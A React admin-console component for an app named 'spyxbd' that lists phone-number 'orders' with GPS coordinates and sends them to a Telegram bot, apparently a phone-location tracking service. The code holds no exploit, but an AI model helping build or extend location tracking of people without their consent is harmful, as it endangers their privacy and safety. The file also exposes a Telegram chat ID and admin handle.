/**
 * spyxbd - Administrator Console Modal
 * For monitoring orders, Telegram delivery status, retrying notifications, and retention policy.
 */

import React, { useState, useEffect } from 'react';
import {
  X,
  Shield,
  Send,
  RefreshCw,
  Trash2,
  ExternalLink,
  CheckCircle2,
  AlertCircle,
  Clock,
  Radio,
  Loader2,
} from 'lucide-react';
import { OrderItem } from '../types';

interface AdminPanelModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export const AdminPanelModal: React.FC<AdminPanelModalProps> = ({ isOpen, onClose }) => {
  const [orders, setOrders] = useState<OrderItem[]>([]);
  const [stats, setStats] = useState<{
    totalOrders: number;
    sentNotifications: number;
    pendingNotifications: number;
    failedNotifications: number;
  }>({ totalOrders: 0, sentNotifications: 0, pendingNotifications: 0, failedNotifications: 0 });
  const [telegramOnline, setTelegramOnline] = useState(false);
  const [loading, setLoading] = useState(false);
  const [actionMessage, setActionMessage] = useState<string | null>(null);
  const [retryingId, setRetryingId] = useState<string | null>(null);

  const fetchAdminData = async () => {
    setLoading(true);
    try {
      const res = await fetch('/api/orders');
      const data = await res.json();
      if (res.ok) {
        setOrders(data.orders || []);
        setStats(data.stats || { totalOrders: 0, sentNotifications: 0, pendingNotifications: 0, failedNotifications: 0 });
        setTelegramOnline(data.telegramOnline || false);
      }
    } catch (err) {
      console.error('Failed to load admin data:', err);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    if (isOpen) {
      fetchAdminData();
    }
  }, [isOpen]);

  const handleTestTelegram = async () => {
    setActionMessage('Testing Telegram connection...');
    try {
      const res = await fetch('/api/admin/test-telegram', { method: 'POST' });
      const data = await res.json();
      if (data.success) {
        setActionMessage('Diagnostic message successfully delivered to Telegram chat 8220144989!');
      } else {
        setActionMessage(`Telegram test report: ${data.error || 'Connection failed'}`);
      }
    } catch {
      setActionMessage('Failed to trigger Telegram test');
    }
  };

  const handleRetryNotification = async (id: string) => {
    setRetryingId(id);
    try {
      const res = await fetch(`/api/orders/${id}/retry-telegram`, { method: 'POST' });
      const data = await res.json();
      if (data.success) {
        setActionMessage(`Order ${id} notification successfully sent!`);
      } else {
        setActionMessage(`Retry result: ${data.result?.error || 'Pending'}`);
      }
      fetchAdminData();
    } catch {
      setActionMessage('Failed to retry notification');
    } finally {
      setRetryingId(null);
    }
  };

  const handleDeleteOrder = async (id: string) => {
    if (!confirm(`Are you sure you want to permanently erase order ${id} under GDPR/privacy policy?`)) return;
    try {
      const res = await fetch(`/api/orders/${id}`, { method: 'DELETE' });
      if (res.ok) {
        setActionMessage(`Order ${id} and associated GPS coordinates erased.`);
        fetchAdminData();
      }
    } catch {
      setActionMessage('Deletion failed');
    }
  };

  const handlePurgeRetention = async () => {
    if (!confirm('Purge location telemetry older than 30 days?')) return;
    try {
      const res = await fetch('/api/admin/purge-retention', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ days: 30 }),
      });
      const data = await res.json();
      setActionMessage(`Purge complete: ${data.purgedCount} expired records deleted.`);
      fetchAdminData();
    } catch {
      setActionMessage('Purge failed');
    }
  };

  if (!isOpen) return null;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/75 backdrop-blur-xs animate-in fade-in duration-200">
      <div className="relative w-full max-w-3xl bg-white rounded-3xl shadow-2xl border border-[#DCE3EC] flex flex-col max-h-[90vh] overflow-hidden">
        {/* Header */}
        <div className="px-6 py-4 bg-[#F5F7FA] border-b border-[#DCE3EC] flex items-center justify-between shrink-0">
          <div className="flex items-center gap-2.5">
            <div className="w-8 h-8 rounded-full bg-[#1769FF]/10 text-[#1769FF] flex items-center justify-center">
              <Shield className="w-4 h-4" />
            </div>
            <div>
              <h3 className="text-lg font-bold text-[#080D18]">Admin Console</h3>
              <p className="text-xs text-[#475569]">
                Admin: @talhajubayer001 • Chat ID: 8220144989
              </p>
            </div>
          </div>
          <button
            onClick={onClose}
            className="p-1.5 rounded-lg text-slate-400 hover:text-[#080D18] hover:bg-slate-200 transition-colors cursor-pointer"
          >
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Action / Status Notice */}
        {actionMessage && (
          <div className="px-6 py-2.5 bg-blue-50 border-b border-blue-200 text-xs text-[#1769FF] flex items-center justify-between">
            <span>{actionMessage}</span>
            <button onClick={() => setActionMessage(null)} className="font-bold ml-2">×</button>
          </div>
        )}

        {/* Content Area */}
        <div className="p-6 overflow-y-auto space-y-6">
          {/* Status Metrics Cards */}
          <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
            <div className="p-3.5 rounded-2xl bg-[#F8FAFC] border border-[#DCE3EC]">
              <span className="text-[11px] text-[#64748B] block">Total Orders</span>
              <span className="text-xl font-black text-[#080D18]">{stats.totalOrders}</span>
            </div>
            <div className="p-3.5 rounded-2xl bg-[#F0FDF4] border border-[#BBF7D0]">
              <span className="text-[11px] text-[#16A34A] block">Telegram Sent</span>
              <span className="text-xl font-black text-[#16A34A]">{stats.sentNotifications}</span>
            </div>
            <div className="p-3.5 rounded-2xl bg-[#FEFCE8] border border-[#FEF08A]">
              <span className="text-[11px] text-[#CA8A04] block">Queued / Pending</span>
              <span className="text-xl font-black text-[#CA8A04]">{stats.pendingNotifications}</span>
            </div>
            <div className="p-3.5 rounded-2xl bg-[#FEF2F2] border border-[#FECACA]">
              <span className="text-[11px] text-[#DC2626] block">Failed Retries</span>
              <span className="text-xl font-black text-[#DC2626]">{stats.failedNotifications}</span>
            </div>
          </div>

          {/* Telegram Service Configuration Strip */}
          <div className="p-4 rounded-2xl bg-[#0B1528] text-white flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4">
            <div className="space-y-1">
              <div className="flex items-center gap-2">
                <Radio className={`w-4 h-4 ${telegramOnline ? 'text-[#22C55E]' : 'text-[#F59E0B]'}`} />
                <span className="font-bold text-sm">
                  {telegramOnline ? 'Telegram Bot Online' : 'Telegram Config Status'}
                </span>
              </div>
              <p className="text-xs text-[#94A3B8]">
                Bot: <span className="font-mono text-white">location_service_provider_bot</span> | Chat: <span className="font-mono text-white">8220144989</span>
              </p>
            </div>
            <div className="flex items-center gap-2 w-full sm:w-auto">
              <button
                onClick={handleTestTelegram}
                className="flex-1 sm:flex-initial px-3 py-2 bg-[#1769FF] hover:bg-[#1255d6] text-white text-xs font-bold rounded-xl flex items-center justify-center gap-1.5 transition-colors cursor-pointer"
              >
                <Send className="w-3.5 h-3.5" />
                <span>Test Bot Ping</span>
              </button>
              <button
                onClick={handlePurgeRetention}
                className="px-3 py-2 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-medium rounded-xl transition-colors cursor-pointer"
                title="Purge orders older than 30 days"
              >
                Purge &gt;30d
              </button>
            </div>
          </div>

          {/* Orders Table */}
          <div>
            <div className="flex items-center justify-between mb-3">
              <h4 className="text-sm font-bold text-[#080D18]">
                Customer Submissions ({orders.length})
              </h4>
              <button
                onClick={fetchAdminData}
                disabled={loading}
                className="text-xs text-[#1769FF] hover:underline flex items-center gap-1 cursor-pointer"
              >
                <RefreshCw className={`w-3.5 h-3.5 ${loading ? 'animate-spin' : ''}`} />
                <span>Refresh List</span>
              </button>
            </div>

            {orders.length === 0 ? (
              <div className="text-center py-8 text-xs text-[#94A3B8] border border-dashed border-[#DCE3EC] rounded-2xl">
                No orders submitted yet. Place a test order from the home page.
              </div>
            ) : (
              <div className="border border-[#DCE3EC] rounded-2xl overflow-hidden divide-y divide-[#DCE3EC]">
                {orders.map((order) => (
                  <div key={order.id} className="p-4 hover:bg-[#F8FAFC] transition-colors text-xs space-y-2">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <div className="flex items-center gap-2">
                        <span className="font-mono font-bold text-[#080D18]">{order.id}</span>
                        <span className="font-mono text-[#1769FF] font-semibold">{order.phoneNumber}</span>
                        {order.operator && (
                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-slate-100 text-[#475569]">
                            {order.operator}
                          </span>
                        )}
                      </div>
                      <div className="flex items-center gap-2">
                        {order.notificationStatus === 'SENT' ? (
                          <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-green-50 text-green-700 border border-green-200">
                            <CheckCircle2 className="w-3 h-3" />
                            Telegram Sent
                          </span>
                        ) : order.notificationStatus === 'PENDING' ? (
                          <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-50 text-amber-700 border border-amber-200">
                            <Clock className="w-3 h-3" />
                            Pending
                          </span>
                        ) : (
                          <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-red-50 text-red-700 border border-red-200">
                            <AlertCircle className="w-3 h-3" />
                            Failed ({order.notificationRetries})
                          </span>
                        )}
                      </div>
                    </div>

                    <div className="flex flex-wrap items-center justify-between gap-2 text-[#64748B] text-[11px]">
                      <div>
                        Lat: <span className="font-mono text-[#080D18]">{order.latitude.toFixed(6)}</span> | Long: <span className="font-mono text-[#080D18]">{order.longitude.toFixed(6)}</span> (±{Math.round(order.accuracyMeters)}m)
                      </div>
                      <div>
                        {new Date(order.createdAt).toLocaleString()}
                      </div>
                    </div>

                    <div className="pt-2 flex items-center justify-end gap-2 border-t border-slate-100">
                      <a
                        href={`https://www.google.com/maps?q=${order.latitude},${order.longitude}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="px-2.5 py-1 rounded bg-[#F5F7FA] text-[#1769FF] hover:underline flex items-center gap-1 text-[11px]"
                      >
                        <span>Map</span>
                        <ExternalLink className="w-3 h-3" />
                      </a>
                      <button
                        onClick={() => handleRetryNotification(order.id)}
                        disabled={retryingId === order.id}
                        className="px-2.5 py-1 rounded bg-[#EFF6FF] text-[#1769FF] hover:bg-[#DBEAFE] font-medium text-[11px] flex items-center gap-1 cursor-pointer"
                      >
                        {retryingId === order.id ? <Loader2 className="w-3 h-3 animate-spin" /> : <Send className="w-3 h-3" />}
                        <span>Send Telegram</span>
                      </button>
                      <button
                        onClick={() => handleDeleteOrder(order.id)}
                        className="p-1 rounded text-slate-400 hover:text-red-600 hover:bg-red-50 cursor-pointer"
                        title="Delete order"
                      >
                        <Trash2 className="w-3.5 h-3.5" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
